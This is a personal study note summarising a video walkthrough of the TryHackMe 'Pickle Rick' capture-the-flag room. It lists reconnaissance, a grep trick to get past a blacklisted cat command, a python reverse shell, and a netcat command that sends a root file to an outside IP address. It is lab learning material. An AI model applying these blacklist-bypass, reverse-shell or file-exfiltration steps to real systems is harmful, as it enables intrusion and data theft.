# TryHackMe! PickleRick - BYPASSING Blacklists
Type : #t/YouTube
Time Created : 2022-06-06 17:29
Last Modified : 2022-06-06 17:29
Subjects: #s/Cybersecurity #s/TryToHackMe
Progress: #p/🟡 
URL: https://www.youtube.com/watch?v=oCAtfcr3iUw
Publisher: #psh/JohnHammond
Priority: #i/🟥 

## Steps
1. Running an Nmap scan on the IP Address
2. fires up **Nikto**
3. can see that port 22 and 80 are open
4. Going into the website
5. Check it's Source Code, and getting a user name `R1ckRul3s`
6. fires up **GoBuster** and looking for another pages in the website (you can `-x` which look for a specific format files in the server 
 For example: `-x php,html,js,htm`)
7. Nikto tells us that there is a file named `robots.txt` which contains `Wubalubadubdub` 
8. GoBuster return us the pages that are on the server and we're trying to get into one, which wants from us login credentials, we're trying the things that we got before and we're in.
9. we see that there's a CMD bar to activate commands.
10. we hit `ls` to list the things that we can hack into
11. because we can't use `cat` to view the info of any file we need to find another way to look into it, you can use he `grep` command and type `grep . FILE.txt` this will match every character into the file and present it basically concatenate it without `cat`.
12. you can type `grep -R` that will run over all of the files and get their info out into the page of the website, which you can view the source after and look through them.
13. and when you are looking trough the page source you can see that there's a base 64 encoding, that you need to decode, in this case you need to try decoded over decode until that works.
14. now we can try to run a reverse shell into the machine.
15. we're going to run this in **Netcat**, but when we're trying to run Netcat is not working, but we can try to look if we have python, in this case we have python3 and we can run a reverse shell using python3.
16. we're openning a Netcat connection in our computer and running the python script in the website (because we're using Netcat the shell that we're going to work on is dumb, to know how to upgrade if look into [[Upgrade a Dumb Reverse Shell into a Fully Functional Terminal Tutorial]])
17. moving **linpeans** into the victim's machine to Escalate privileges (you can see how to transfer a file through Netcat, you're creating a net connection on a different port, and send the file by typing in the **receiving** `nc -l -p 8585 > file.txt` and int the sending `nc -N 45.58.46.205 8585 < /root/file.txt` )
18. and look on all of the things that in <mark style="background: #FF5582A6;">red</mark>